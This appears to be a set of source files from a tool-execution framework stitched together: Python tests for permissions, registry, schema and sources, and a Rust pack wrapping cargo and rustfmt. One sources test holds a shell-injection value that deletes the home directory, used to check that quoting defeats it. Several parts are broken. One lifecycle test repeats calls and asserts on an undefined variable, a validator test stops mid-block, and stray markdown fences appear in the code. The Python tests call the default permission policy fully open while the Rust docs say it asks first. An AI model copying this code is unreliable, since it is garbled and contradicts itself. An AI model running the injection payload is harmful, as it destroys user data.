"""Executor layer tests (run via asyncio.run — no pytest-asyncio needed)."""
import asyncio

from rc_python.core import Tool, ToolContext, ToolError, ToolSourceKind
from rc_python.schema import ParamType, Parameter, Schema
from rc_python.registry import Registry
from rc_python.executor import Executor
from rc_python.permissions import Permission, PermissionPolicy, PermissionRule
from rc_python.sandbox import Sandbox


class _Add(Tool):
    def name(self): return "math.add"
    def description(self): return "add two ints"
    def schema(self):
        return Schema.new().param(Parameter.required("a", ParamType.number())).param(Parameter.required("b", ParamType.number()))
    def source(self): return ToolSourceKind.Builtin
    async def execute(self, input, ctx):
        return float(input["a"]) + float(input["b"])


class _Fetch(Tool):
    """A `web.*` tool — Ask under the default policy."""
    def name(self): return "web.fetch"
    def description(self): return "fetch"
    def schema(self):
        return Schema.new().param(Parameter.required("url", ParamType.string()))
    def source(self): return ToolSourceKind.Builtin
    async def execute(self, input, ctx):
        return {"url": input["url"]}


def _make(policy=None):
    r = Registry()
    r.register(_Add())
    r.register(_Fetch())
    return Executor(r, policy or PermissionPolicy.default_policy(), Sandbox())


def test_run_allow():
    ex = _make()
    out = asyncio.run(ex.run("math.add", {"a": 2, "b": 3}, False))
    assert out == 5.0


def test_run_ask_needs_approval():
    # The shipped default is fully open, so force Ask with an explicit
    # opt-in policy to cover the Ask machinery.
    policy = PermissionPolicy.default_policy().ask_("*")
    ex = _make(policy)
    try:
        asyncio.run(ex.run("web.fetch", {"url": "x"}, False))
        assert False
    except ToolError as e:
        assert e.kind == "permission_denied"
    # with approval it runs
    out = asyncio.run(ex.run("web.fetch", {"url": "x"}, True))
    assert out == {"url": "x"}


def test_default_policy_runs_everything():
    """The shipped default policy runs every tool without approval."""
    ex = _make()
    out = asyncio.run(ex.run("web.fetch", {"url": "x"}, False))
    assert out == {"url": "x"}


def test_run_deny_blocked():
    policy = PermissionPolicy.default_policy().deny_("web.*")
    ex = _make(policy)
    try:
        asyncio.run(ex.run("web.fetch", {"url": "x"}, True))
        assert False
    except ToolError as e:
        assert e.kind == "permission_denied"


def test_validation_fills_defaults():
    class _Echo(Tool):
        def name(self): return "text.echo"
        def description(self): return ""
        def schema(self):
            return (
                Schema.new()
                .param(Parameter.required("msg", ParamType.string()))
                .param(Parameter.optional("loud", ParamType.boolean()).with_default(False))
            )
        def source(self): return ToolSourceKind.Builtin
        async def execute(self, input, ctx):
            return input["msg"].upper() if input["loud"] else input["msg"]

    r = Registry()
    r.register(_Echo())
    ex = Executor(r, PermissionPolicy.default_policy(), Sandbox())
    out = asyncio.run(ex.run("text.echo", {"msg": "hi"}, False))
    assert out == "hi"

"""Lifecycle layer tests."""
import asyncio

from rc_python import Lifecycle, BuiltinSource, PythonSource
from rc_python.core import ToolError


def test_discover_registers_builtin_catalog():
    life = Lifecycle.permissive()
    life.add_source(BuiltinSource())
    n = asyncio.run(life.discover())
    assert n >= 10
    assert life.registry.contains("math.add")
    assert life.registry.contains("time.now")


def test_execute_records_metrics_and_version_report():
    life = Lifecycle.permissive()
    life.add_source(BuiltinSource())
    asyncio.run(life.discover())
    out = asyncio.run(life.execute("math.add", {"a": 2, "b": 3}, False))
    assert out == 5.0
    m = life.metrics_for("math.add")
    assert m is not None and m.calls == 1 and m.successes == 1
    # version report is sorted and mentions the tool
    report = life.version_report()
    assert ("math.add", "0.1.0", "builtin") in report
    assert report == sorted(report, key=lambda t: t[0])

    life.add_source(BuiltinSource())

    life.add_source(BuiltinSource())

    assert not life.registry.contains("math.add")
    assert life.retire("math.add") is False
    # executing a retired tool raises not_found and records a failure
    try:
        asyncio.run(life.execute("math.add", {"a": 1, "b": 1}, False))
        assert False
    except ToolError as e:
        assert e.kind == "not_found"
    m = life.metrics_for("math.add")
    assert m is not None and m.failures == 1

    life.add_source(BuiltinSource())

    assert n == 7 + len(asyncio.run(BuiltinSource().tools()))
    assert life.registry.contains("python.version")
    assert life.registry.contains("math.add")

"""Permissions layer tests."""
from rc_python.core import Tool, ToolSourceKind
from rc_python.schema import Schema
from rc_python.permissions import Permission, PermissionPolicy, PermissionRule, glob_match


class _Named(Tool):
    def __init__(self, n):
        self._n = n

    def name(self):
        return self._n

    def description(self):
        return ""

    def schema(self):
        return Schema.new()

    def source(self):
        return ToolSourceKind.Builtin

    async def execute(self, input, ctx):
        return {}


def test_glob():
    assert glob_match("math.*", "math.add")
    assert glob_match("math.*", "math.deep.nested")
    assert not glob_match("math.*", "text.upper")
    assert glob_match("*", "anything.at.all")
    assert glob_match("a?c", "abc")
    assert not glob_match("a?c", "ac")


def test_default_policy_is_fully_open():
    """The shipped default carries no rules: everything is ALLOW — including
    the system.* tools older defaults hard-denied."""
    p = PermissionPolicy.default_policy()
    for name in ("math.add", "text.upper", "system.env", "unknown.thing", "anything.at.all"):
        assert p.decide(_Named(name)) == Permission.ALLOW, name


def test_deny_wins_over_allow():
    """Rule precedence on an explicit opt-in policy (default has no rules)."""
    p = (
        PermissionPolicy.default_policy()
        .allow_("dangerous.*")
        .deny_("dangerous.rm")
        .with_default(Permission.ASK)
    )
    assert p.decide(_Named("dangerous.rm")) == Permission.DENY
    assert p.decide(_Named("dangerous.other")) == Permission.ALLOW
    assert p.decide(_Named("math.add")) == Permission.ASK
    assert p.decide(_Named("web.fetch")) == Permission.ASK

"""Registry layer tests."""
from rc_python.core import Tool, ToolContext, ToolError, ToolSourceKind
from rc_python.schema import ParamType, Parameter, Schema
from rc_python.registry import Registry


class _Stub(Tool):
    def __init__(self, name, desc="stub"):
        self._n = name
        self._d = desc

    def name(self):
        return self._n

    def description(self):
        return self._d

    def schema(self):
        return Schema.new().param(Parameter.required("x", ParamType.integer()))

    def source(self):
        return ToolSourceKind.Builtin

    async def execute(self, input, ctx):
        return input["x"]


def test_register_get_remove():
    r = Registry()
    assert r.is_empty()
    t = _Stub("test.dummy")
    r.register(t)
    assert len(r) == 1
    assert r.contains("test.dummy")
    assert r.get("test.dummy") is t
    try:
        r.get("nope")
        assert False
    except ToolError as e:
        assert e.kind == "not_found"
    assert r.remove("test.dummy") is t
    assert r.is_empty()


def test_register_replaces_and_returns_prev():
    r = Registry()
    a = _Stub("t.x", "a")
    b = _Stub("t.x", "b")
    r.register(a)
    prev = r.register(b)
    assert prev is a
    assert r.get("t.x").description() == "b"


def test_list_and_names_sorted():
    r = Registry()
    r.register_all([_Stub("b.x"), _Stub("a.x")])
    assert r.names() == ["a.x", "b.x"]
    infos = r.list()
    assert [i.name for i in infos] == ["a.x", "b.x"]
    assert infos[0].source == "builtin"

"""Schema layer tests."""
from rc_python.schema import ParamType, Parameter, Schema


def test_paramtype_checks():
    assert ParamType.string().check.__self__  # bound method exists
    ParamType.string().check("hi")
    ParamType.integer().check(42)
    ParamType.number().check(3.14)
    ParamType.boolean().check(True)

    # bool is NOT an integer here (Python conflates them; we guard)
    try:
        ParamType.integer().check(True)
        assert False, "bool should not pass Integer"
    except ValueError:
        pass

    # array inner-type check
    ParamType.array(ParamType.string()).check(["a", "b"])
    try:
        ParamType.array(ParamType.integer()).check(["a"])
        assert False
    except ValueError:
        pass


def test_parameter_builders():
    p = Parameter.required("n", ParamType.integer()).with_desc("count").with_default(0)
    assert p.required and p.name == "n" and p.description == "count" and p.default == 0
    o = Parameter.optional("g", ParamType.string())
    assert not o.required


def test_schema_to_json_schema():
    s = (
        Schema.new()
        .param(Parameter.required("n", ParamType.integer()).with_desc("count"))
        .param(Parameter.optional("greeting", ParamType.string()).with_default("hi"))
    )
    j = s.to_json_schema()
    assert j["type"] == "object"
    assert j["required"] == ["n"]
    assert j["properties"]["n"]["type"] == "integer"
    assert j["properties"]["n"]["description"] == "count"
    assert j["properties"]["greeting"]["default"] == "hi"

"""Sources layer tests."""
import asyncio

from rc_python.sources import (
    BuiltinSource,
    CliSource,
    DeclarativeSource,
    SourceRegistry,
    builtin_all_tools,
)
from rc_python.sources.tools import ShellTool, one_string_param
from rc_python.core import ToolSourceKind
from rc_python.schema import ParamType, Parameter, Schema


def test_builtin_source_yields_catalog():
    src = BuiltinSource()
    assert src.kind() == ToolSourceKind.Builtin
    assert src.id() == "builtin"
    tools = asyncio.run(src.tools())
    assert len(tools) == len(builtin_all_tools())
    names = sorted(t.name() for t in tools)
    deduped = sorted(set(names))
    assert names == deduped, f"duplicate builtin names: {names}"
    # every category is one of the known set
    cats = {t.category() for t in tools}
    assert cats.issubset({"math", "text", "data", "code", "time"})


def test_declarative_source_builds_shell_tools():
    specs = [
        {
            "name": "git.status",
            "description": "git status",
            "command": "git -C {{repo}} status --porcelain",
            "params": [
                {"name": "repo", "type": "string", "required": True, "description": "repo path"},
            ],
        },
        {
            "name": "echo.msg",
            "description": "echo",
            "command": "printf %s {{msg}}",
            "params": [
                {"name": "msg", "type": "string", "required": True},
                {"name": "upper", "type": "boolean", "required": False, "default": False},
            ],
        },
    ]
    src = DeclarativeSource(specs, source_id="decl:test")
    assert src.kind() == ToolSourceKind.Declarative
    tools = asyncio.run(src.tools())
    assert [t.name() for t in tools] == ["git.status", "echo.msg"]
    assert all(t.source() == ToolSourceKind.Declarative for t in tools)
    # the shell tool renders its template
    echo = tools[1]
    assert isinstance(echo, ShellTool)
    # Values are data, not code: a safe word passes through, while any value
    # with shell metacharacters is quoted as ONE literal shell word.
    assert echo.render({"msg": "hi", "upper": False}) == "printf %s hi"
    # An injection payload must arrive as ONE quoted literal word: the text
    # is echoed back verbatim and no command is executed.
    from rc_python.core import ToolContext
    hostile = "x; rm -rf ~"
    rendered = echo.render({"msg": hostile, "upper": False})
    assert rendered == "printf %s 'x; rm -rf ~'"
    out = asyncio.run(echo.execute({"msg": hostile, "upper": False}, ToolContext()))
    assert out["exit_code"] == 0
    assert out["stdout"] == hostile


def test_source_registry_runs_all_concurrently():
    sr = SourceRegistry()
    assert sr.is_empty()
    sr.add(BuiltinSource())
    sr.add(DeclarativeSource([{"name": "x.y", "description": "", "command": "true", "params": []}]))
    assert len(sr) == 2
    tools = asyncio.run(sr.all_tools())
    names = sorted(t.name() for t in tools)
    assert "x.y" in names
    assert "math.add" in names


def test_cli_source_one_tool():
    src = CliSource(
        name="sys.whoami",
        description="whoami",
        schema=Schema.new(),
        command="whoami",
    )
    assert src.kind() == ToolSourceKind.Cli
    tools = asyncio.run(src.tools())
    assert len(tools) == 1 and tools[0].name() == "sys.whoami"


def test_shell_tool_runs_echo():
    t = ShellTool(
        name="test.echo",
        description="echo",
        schema=one_string_param("msg", "the message"),
        command="printf %s {{msg}}",
    )
    from rc_python.core import ToolContext
    out = asyncio.run(t.execute({"msg": "hi"}, ToolContext()))
    assert out["exit_code"] == 0
    assert out["stdout"] == "hi"

from rc_python.schema import ParamType, Parameter, Schema
from rc_python.validator import validate
from rc_python.core import ToolError


def test_fills_defaults_and_type_checks():
    s = (
        Schema.new()
        .param(Parameter.required("n", ParamType.integer()))
        .param(Parameter.optional("label", ParamType.string()).with_default("hi"))
    )
    v = validate(s, {"n": 5})

    try:

//! # rc-rust — the Rust language pack + framework entry point
//!
//! `rc-rust` does two things:
//!
//! 1. **A Rust language pack** — eight `rust.*` developer-workflow tools
//!    ([`tools`]): `cargo check / build / test / fmt / clippy / doc`,
//!    `rust.toolchain`, and `rust.fmt_file`. Each is a first-class
//!    [`rc_core::Tool`] behind the framework's sandbox + permission gate, and
//!    each returns the same `{exit_code, stdout, stderr}` shape the `cli` and
//!    `declarative` sources produce — so a `rust.*` step composes identically
//!    to any other tool.
//!
//! 2. **A framework entry point** — re-exports the whole rc-* surface (core,
//!    builtin, sources, compose, lifecycle) in one place, so `use rc_rust::*`
//!    gives a caller the full builder *plus* the Rust tools. The
//!    [`RustSource`] adapter makes the eight tools discoverable through the
//!    standard [`ToolSource`](rc_sources::ToolSource) contract.
//!
//! ## Quick start
//!
//! ```no_run
//! # use rc_rust as rc;
//! # async fn run() -> Result<(), Box<dyn std::error::Error>> {
//! let mut life = rc::Lifecycle::permissive();
//! life.add_source(rc::RustSource);                  // the 8 rust.* tools
//! life.add_source(rc::BuiltinSource);               // the 38-tool catalog
//! let n = life.discover().await?;                   // registers 8 + 38 tools
//! assert_eq!(n, rc::COUNT + rc::BUILTIN_COUNT);
//! // run `cargo check` on the current directory (caller-approved):
//! let out = life.execute("rust.cargo_check", &rc::serde_json::json!({}), true).await?;
//! println!("exit={} stderr={}", out["exit_code"], out["stderr"]);
//! # Ok(()) }
//! ```
//!
//! Because the `rust.*` tools spawn subprocesses and touch the filesystem,
//! the default permission policy leaves them at `Ask` (read-only classes like
//! `math.*` are `Allow`). Pass `approved = true` once the caller has
//! confirmed.

pub mod source;
pub mod tools;

// ── Framework re-exports: one `use rc_rust::*` gives the whole builder. ──────
pub use rc_core::{
    arc, Catalog, Executor, Manifest, ParamType, Parameter, Permission, PermissionPolicy,
    PermissionRule, Registry, Sandbox, Schema, Tool, ToolArc, ToolContext, ToolError, ToolInfo,
    ToolResult, ToolSourceKind, Validator, VERSION,
};
pub use rc_builtin::{all_tools as builtin_all_tools, CATEGORIES as BUILTIN_CATEGORIES, COUNT as BUILTIN_COUNT};
pub use rc_sources::{
    builtin::BuiltinSource, HttpTool, ShellTool, SourceError, SourceRegistry, ToolSource,
    builtin_only,
};
// Re-export the JSON crates so callers (and doctests) get them from one place.
pub use serde_json;
pub use serde;
pub use rc_compose::{
    BranchArm, BranchTool, DagNode, DagTool, LoopTool, ParallelStep, ParallelTool, PipelineStep,
    PipelineTool, pipe,
};
pub use rc_lifecycle::{Lifecycle, MetricsStore, ToolMetrics};

// ── This crate's own surface. ────────────────────────────────────────────────
pub use source::RustSource;
pub use tools::{all, CATEGORY, COUNT};

/// Every tool this crate contributes — the eight `rust.*` tools — ready to
/// register in a [`Registry`].
pub fn all_tools() -> Vec<ToolArc> {
    tools::all()
}

/// A convenience: build a [`Lifecycle`](rc_lifecycle::Lifecycle) pre-loaded
/// with the Rust language pack **and** the 38-tool builtin catalog, with a
/// permissive policy. Add more sources (declarative, openapi, …) on the
/// returned lifecycle before calling `discover`.
pub fn rust_lifecycle() -> Lifecycle {
    let mut life = Lifecycle::permissive();
    life.add_source(RustSource);
    life.add_source(rc_sources::builtin::BuiltinSource);
    life
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn all_tools_exposes_eight() {
        assert_eq!(all_tools().len(), COUNT);
    }

    #[tokio::test]
    async fn rust_lifecycle_discovers_rust_and_builtin() {
        let life = rust_lifecycle();
        let n = life.discover().await.expect("discover");
        // 8 rust tools + the 38 builtin tools.
        assert_eq!(n, COUNT + BUILTIN_COUNT);
        assert!(life.registry.contains("rust.cargo_check"));
        assert!(life.registry.contains("math.add"));
    }

    #[test]
    fn reexports_are_reachable() {
        // sanity: the re-exported symbols compile into the public surface.
        let _policy = PermissionPolicy::default();
        let _sandbox = Sandbox::default();
        let _reg = Registry::new();
        let _: Schema = Schema::new().param(Parameter::required("x", ParamType::Integer));
    }
}
````

//! The `RustSource` adapter — presents the `rust.*` language pack through the
//! same [`rc_sources::ToolSource`] contract as every other source (builtin,
//! declarative, openapi, …). Adding it to a [`SourceRegistry`] makes the eight
//! Rust-dev tools discoverable by the lifecycle manager alongside the rest.
//!
//! `RustSource` reports [`ToolSourceKind::Builtin`] because, like
//! `rc-builtin`, these tools ship with the framework — the `rust` category is
//! carried in each tool's name, not in the source kind.

use async_trait::async_trait;
use rc_core::tool::{ToolArc, ToolSourceKind};
use rc_sources::{SourceError, ToolSource};

/// A tool source that yields the eight `rust.*` developer-workflow tools.
#[derive(Debug, Default, Clone, Copy)]
pub struct RustSource;

#[async_trait]
impl ToolSource for RustSource {
    fn kind(&self) -> ToolSourceKind {
        ToolSourceKind::Builtin
    }
    fn id(&self) -> &str {
        "rust"
    }
    async fn tools(&self) -> Result<Vec<ToolArc>, SourceError> {
        Ok(crate::tools::all())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use rc_sources::SourceRegistry;

    #[tokio::test]
    async fn yields_every_rust_tool() {
        let src = RustSource;
        assert_eq!(src.kind(), ToolSourceKind::Builtin);
        assert_eq!(src.id(), "rust");
        let tools = src.tools().await.expect("rust source loads");
        assert_eq!(tools.len(), crate::tools::COUNT);
        assert!(tools.iter().all(|t| t.name().starts_with("rust.")));
    }

    #[tokio::test]
    async fn registers_via_source_registry() {
        let mut sr = SourceRegistry::new();
        sr.add(RustSource);
        assert_eq!(sr.len(), 1);
        let tools = sr.all_tools().await.expect("all_tools");
        assert_eq!(tools.len(), crate::tools::COUNT);
    }
}

## `crates/rc-tools/rc-rust/src/tools.rs`

[view on disk](crates/rc-tools/rc-rust/src/tools.rs)

```rust
//! `rust.*` tools — the Rust language pack. Eight developer-workflow tools,
//! each a first-class [`rc_core::Tool`], that wrap the Rust toolchain
//! (`cargo`, `rustc`, `rustfmt`) behind the framework's sandbox + permission
//! gate. They are side-effecting (they spawn subprocesses, touch the
//! filesystem), so the default permission policy leaves them at `Ask` — the
//! caller must approve before the executor will run them.
//!
//! | tool | what it runs |
//! |------|--------------|
//! | `rust.toolchain`   | `rustc --version` + `cargo --version` |
//! | `rust.cargo_check` | `cargo check` |
//! | `rust.cargo_build` | `cargo build` |
//! | `rust.cargo_test`  | `cargo test` |
//! | `rust.cargo_fmt`   | `cargo fmt` (or `--check`) |
//! | `rust.cargo_clippy`| `cargo clippy` |
//! | `rust.cargo_doc`   | `cargo doc --no-deps` |
//! | `rust.fmt_file`    | `rustfmt <path>` |
//!
//! Every subprocess tool returns the same shape the `cli`/`declarative` sources
//! produce: `{ "exit_code": int, "stdout": str, "stderr": str }`, so a
//! composed pipeline can treat a `rust.*` step exactly like any other.

use async_trait::async_trait;
use rc_core::error::{ToolError, ToolResult};
use rc_core::schema::{ParamType, Parameter, Schema};
use rc_core::tool::{arc, Tool, ToolArc, ToolContext, ToolSourceKind};
use serde_json::Value;
use std::process::Stdio;

/// Run a command and return the standard `{exit_code, stdout, stderr}` JSON.
/// Honours `ctx.is_cancelled()` (returns early without spawning) so a parent
/// can abort a long `cargo build`; kills the child when the future is dropped
/// (executor timeout / cancellation) so no build process is left running
/// detached. Spawn failures (binary not on `$PATH`) surface as
/// `ToolError::ToolFailed` rather than panicking.
async fn run(program: &str, args: &[&str], cwd: Option<&str>, ctx: &ToolContext) -> ToolResult<Value> {
    if ctx.is_cancelled() {
        return Err(ToolError::Other("cancelled before rust tool".to_string()));
    }
    let mut cmd = tokio::process::Command::new(program);
    cmd.args(args);
    // A timed-out or cancelled tool call must not leave `cargo build` etc.
    // running as an orphan: the child dies when this future is dropped.
    cmd.kill_on_drop(true);
    if let Some(dir) = cwd {
        cmd.current_dir(dir);
    }
    cmd.stdout(Stdio::piped()).stderr(Stdio::piped());
    let output = cmd.output().await.map_err(|e| ToolError::ToolFailed {
        tool: program.to_string(),
        inner: format!("spawn {program}: {e}"),
    })?;
    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
    let code = output.status.code().unwrap_or(-1);
    Ok(serde_json::json!({
        "exit_code": code,
        "stdout": stdout,
        "stderr": stderr,
    }))
}

/// Pull an optional string param out of the input JSON (None if absent/null).
fn opt_str<'a>(input: &'a Value, key: &str) -> Option<&'a str> {
    input.get(key).and_then(|v| v.as_str())
}

/// Pull an optional array-of-strings param, tolerating non-string elements by
/// stringifying them (matches the `ShellTool` rendering rule).
fn opt_string_array(input: &Value, key: &str) -> Vec<String> {
    input
        .get(key)
        .and_then(|v| v.as_array())
        .map(|arr| {
            arr.iter()
                .map(|v| match v {
                    Value::String(s) => s.clone(),
                    Value::Null => String::new(),
                    other => other.to_string(),
                })
                .collect()
        })
        .unwrap_or_default()
}

// ─── rust.toolchain ──────────────────────────────────────────────────────────

pub struct Toolchain;

#[async_trait]
impl Tool for Toolchain {
    fn name(&self) -> &str { "rust.toolchain" }
    fn description(&self) -> &str {
        "Report the installed Rust toolchain versions (`rustc` + `cargo`)."
    }
    fn schema(&self) -> Schema { Schema::new() }
    fn source(&self) -> ToolSourceKind { ToolSourceKind::Builtin }
    async fn execute(&self, _input: &Value, ctx: &ToolContext) -> ToolResult<Value> {
        let rustc = run("rustc", &["--version"], None, ctx).await?;
        let cargo = run("cargo", &["--version"], None, ctx).await?;
        // Collapse to the version lines (first line of stdout); fall back to
        // the full stdout if the binary printed something unexpected.
        let rustc_v = rustc["stdout"].as_str().map(|s| s.lines().next().unwrap_or(s).to_string())
            .unwrap_or_default();
        let cargo_v = cargo["stdout"].as_str().map(|s| s.lines().next().unwrap_or(s).to_string())
            .unwrap_or_default();
        Ok(serde_json::json!({
            "rustc": rustc_v,
            "cargo": cargo_v,
            "rustc_exit": rustc["exit_code"],
            "cargo_exit": cargo["exit_code"],
        }))
    }
}

// ─── the cargo subcommand tools ──────────────────────────────────────────────

/// A schema shared by every `cargo <sub>` tool: an optional `cwd`, an optional
/// `package` (`-p`), and optional `extra_args` forwarded verbatim.
fn cargo_schema() -> Schema {
    Schema::new()
        .param(Parameter::optional("cwd", ParamType::String)
            .with_desc("directory to run cargo in (defaults to current dir)"))
        .param(Parameter::optional("package", ParamType::String)
            .with_desc("cargo `-p` package selector"))
        .param(Parameter::optional("extra_args", ParamType::Array(Box::new(ParamType::String)))
            .with_desc("extra arguments forwarded after the subcommand"))
}

/// Build the argv for a `cargo <sub>` invocation from the input.
fn cargo_argv(sub: &str, input: &Value) -> Vec<String> {
    let mut argv = vec![sub.to_string()];
    if let Some(pkg) = opt_str(input, "package") {
        argv.push("-p".into());
        argv.push(pkg.to_string());
    }
    argv.extend(opt_string_array(input, "extra_args"));
    argv
}

macro_rules! cargo_tool {
    ($struct:ident, $name:expr, $desc:expr, $sub:expr) => {
        pub struct $struct;
        #[async_trait]
        impl Tool for $struct {
            fn name(&self) -> &str { $name }
            fn description(&self) -> &str { $desc }
            fn schema(&self) -> Schema { cargo_schema() }
            fn source(&self) -> ToolSourceKind { ToolSourceKind::Builtin }
            async fn execute(&self, input: &Value, ctx: &ToolContext) -> ToolResult<Value> {
                let argv = cargo_argv($sub, input);
                let refs: Vec<&str> = argv.iter().map(|s| s.as_str()).collect();
                run("cargo", &refs, opt_str(input, "cwd"), ctx).await
            }
        }
    };
}

cargo_tool!(CargoCheck,  "rust.cargo_check",  "Run `cargo check` (type-check without codegen).", "check");
cargo_tool!(CargoBuild,  "rust.cargo_build",  "Run `cargo build` (compile the workspace).", "build");
cargo_tool!(CargoTest,   "rust.cargo_test",   "Run `cargo test` (the workspace's test suite).", "test");
cargo_tool!(CargoClippy, "rust.cargo_clippy", "Run `cargo clippy` (the linter).", "clippy");
cargo_tool!(CargoDoc,    "rust.cargo_doc",    "Run `cargo doc --no-deps` (build docs).", "doc");

// `cargo fmt` is special: it takes a `--check` flag and never accepts
// `extra_args` the same way (rustfmt flags, not cargo flags), so it gets a
// hand-written impl instead of the macro.
pub struct CargoFmt;

#[async_trait]
impl Tool for CargoFmt {
    fn name(&self) -> &str { "rust.cargo_fmt" }
    fn description(&self) -> &str {
        "Run `cargo fmt` on the workspace. Set `check=true` for `--check` (dry-run)."
    }
    fn schema(&self) -> Schema {
        Schema::new()
            .param(Parameter::optional("cwd", ParamType::String)
                .with_desc("directory to run cargo fmt in"))
            .param(Parameter::optional("check", ParamType::Boolean)
                .with_desc("if true, run `cargo fmt --check` (report, don't rewrite)")
                .with_default(serde_json::json!(false)))
            .param(Parameter::optional("package", ParamType::String)
                .with_desc("cargo `-p` package selector"))
    }
    fn source(&self) -> ToolSourceKind { ToolSourceKind::Builtin }
    async fn execute(&self, input: &Value, ctx: &ToolContext) -> ToolResult<Value> {
        let mut argv = vec!["fmt".to_string()];
        if let Some(pkg) = opt_str(input, "package") {
            argv.push("-p".into());
            argv.push(pkg.to_string());
        }
        if input.get("check").and_then(|v| v.as_bool()).unwrap_or(false) {
            argv.push("--check".into());
        }
        let refs: Vec<&str> = argv.iter().map(|s| s.as_str()).collect();
        run("cargo", &refs, opt_str(input, "cwd"), ctx).await
    }
}

// ─── rust.fmt_file ───────────────────────────────────────────────────────────

pub struct FmtFile;

#[async_trait]
impl Tool for FmtFile {
    fn name(&self) -> &str { "rust.fmt_file" }
    fn description(&self) -> &str {
        "Format a single Rust file in place with `rustfmt`."
    }
    fn schema(&self) -> Schema {
        Schema::new()
            .param(Parameter::required("path", ParamType::String)
                .with_desc("path to the .rs file to format"))
            .param(Parameter::optional("edition", ParamType::String)
                .with_desc("rustfmt `--edition` (e.g. 2021)"))
    }
    fn source(&self) -> ToolSourceKind { ToolSourceKind::Builtin }
    async fn execute(&self, input: &Value, ctx: &ToolContext) -> ToolResult<Value> {
        let path = input["path"].as_str().ok_or_else(|| ToolError::BadParam {
            name: "path".into(),
            expected: ParamType::String,
            detail: "missing or not a string".into(),
        })?;
        let mut argv = vec!["rustfmt".to_string()];
        if let Some(ed) = opt_str(input, "edition") {
            argv.push("--edition".into());
            argv.push(ed.to_string());
        }
        argv.push(path.to_string());
        let refs: Vec<&str> = argv.iter().map(|s| s.as_str()).collect();
        run("rustfmt", &refs, None, ctx).await
    }
}

/// Every `rust.*` tool, ready to register.
pub fn all() -> Vec<ToolArc> {
    vec![
        arc(Toolchain),
        arc(CargoCheck),
        arc(CargoBuild),
        arc(CargoTest),
        arc(CargoFmt),
        arc(CargoClippy),
        arc(CargoDoc),
        arc(FmtFile),
    ]
}

/// The number of `rust.*` tools (for `rc sources rust`).
pub const COUNT: usize = 8;

/// The category label every `rust.*` tool carries (derived from the name's
/// first segment).
pub const CATEGORY: &str = "rust";

#[cfg(test)]
mod tests {
    use super::*;
    use rc_core::Registry;

    #[test]
    fn all_tools_unique_and_complete() {
        let tools = all();
        assert_eq!(tools.len(), COUNT);
        let mut names: Vec<String> = tools.iter().map(|t| t.name().to_string()).collect();
        names.sort();
        let mut deduped = names.clone();
        deduped.dedup();
        assert_eq!(names.len(), deduped.len(), "duplicate rust tool names: {names:?}");
        // every name is under the `rust.` namespace
        for t in &tools {
            assert!(t.name().starts_with("rust."), "{}", t.name());
            assert_eq!(t.category(), CATEGORY);
            assert_eq!(t.source(), ToolSourceKind::Builtin);
        }
    }

    #[test]
    fn registers_cleanly() {
        let r = Registry::new();
        r.register_all(all());
        assert_eq!(r.len(), COUNT);
        for t in all() {
            assert!(r.contains(t.name()));
        }
    }

    #[tokio::test]
    async fn cancelled_does_not_spawn() {
        // A cancelled context must short-circuit before touching the toolchain,
        // so this test passes even on a host without rustc installed.
        let ctx = ToolContext {
            cancelled: true,
            ..ToolContext::default()
        };
        let out = Toolchain.execute(&serde_json::json!({}), &ctx).await;
        assert!(out.is_err(), "expected cancellation error, got {out:?}");
        let err = out.unwrap_err().to_string();
        assert!(err.contains("cancelled"), "unexpected error: {err}");
    }

    #[test]
    fn cargo_argv_assembles_package_and_extras() {
        let input = serde_json::json!({
            "package": "rc-core",
            "extra_args": ["--lib", "--message-format=json"]
        });
        let argv = cargo_argv("check", &input);
        assert_eq!(argv, vec!["check", "-p", "rc-core", "--lib", "--message-format=json"]);
    }

    #[tokio::test]
    async fn toolchain_reports_versions() {
        // Only meaningful when rustc/cargo are on $PATH; skip gracefully if not.
        if std::process::Command::new("rustc").arg("--version").output().is_err() {
            eprintln!("skipping toolchain_reports_versions: rustc not on PATH");
            return;
        }
        let out = Toolchain
            .execute(&serde_json::json!({}), &ToolContext::default())
            .await
            .expect("toolchain runs");
        let rustc = out["rustc"].as_str().unwrap_or("");
        assert!(rustc.contains("rustc"), "rustc line: {rustc:?}");
    }
}

````rust
//! Source 2 of 8 — **declarative**. A user writes a YAML or JSON file listing
//! tools (each a name, description, command template, and params); the source
//! builds a [`ShellTool`] for each. No Rust code is written — this is how a
//! non-developper adds tools.
//!
//! Values substituted into `{{param}}` placeholders are always shell-quoted
//! into single literal shell words (see `rc_sources::tools::shell_quote`), so
//! templates must not wrap placeholders in their own quotes.
//!
//! ```yaml
//! tools:
//!   - name: git.status
//!     description: Show git working-tree status
//!     command: "git -C {{repo}} status --porcelain"
//!     params:
//!       - { name: repo, type: string, required: true, description: repo path }
//!   - name: disk.du
//!     description: Disk usage of a directory
//!     command: "du -sh {{path}}"
//!     params:
//!       - { name: path, type: string, required: true }
//! ```

use crate::source::{SourceError, ToolSource};
use crate::tools::ShellTool;
use async_trait::async_trait;
use rc_core::schema::{ParamType, Parameter, Schema};
use rc_core::tool::{ToolArc, ToolSourceKind};
use serde::{Deserialize, Serialize};
use serde_json::Value;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeclarativeSpec {
    #[serde(default)]
    pub tools: Vec<DeclarativeTool>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeclarativeTool {
    pub name: String,
    #[serde(default)]
    pub description: String,
    pub command: String,
    #[serde(default)]
    pub params: Vec<DeclarativeParam>,
    #[serde(default)]
    pub cwd: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeclarativeParam {
    pub name: String,
    #[serde(rename = "type")]
    pub typ: String,
    #[serde(default)]
    pub required: bool,
    #[serde(default)]
    pub description: String,
    #[serde(default)]
    pub default: Option<Value>,
}

pub fn parse_param_type(s: &str) -> ParamType {
    match s {
        "string" => ParamType::String,
        "integer" => ParamType::Integer,
        "number" => ParamType::Number,
        "boolean" => ParamType::Boolean,
        "object" => ParamType::Object,
        "any" => ParamType::Any,
        _ => ParamType::String, // lenient default
    }
}

impl DeclarativeSpec {
    /// Parse a YAML or JSON string. JSON is valid YAML, so we try YAML first.
    pub fn parse(content: &str) -> Result<Self, SourceError> {
        serde_yaml::from_str::<DeclarativeSpec>(content).map_err(|e| SourceError::Yaml {
            src: "declarative".into(),
            inner: e,
        })
    }
    /// Load from a file path (auto-detects YAML/JSON by content).
    pub async fn load_file(path: &str) -> Result<Self, SourceError> {
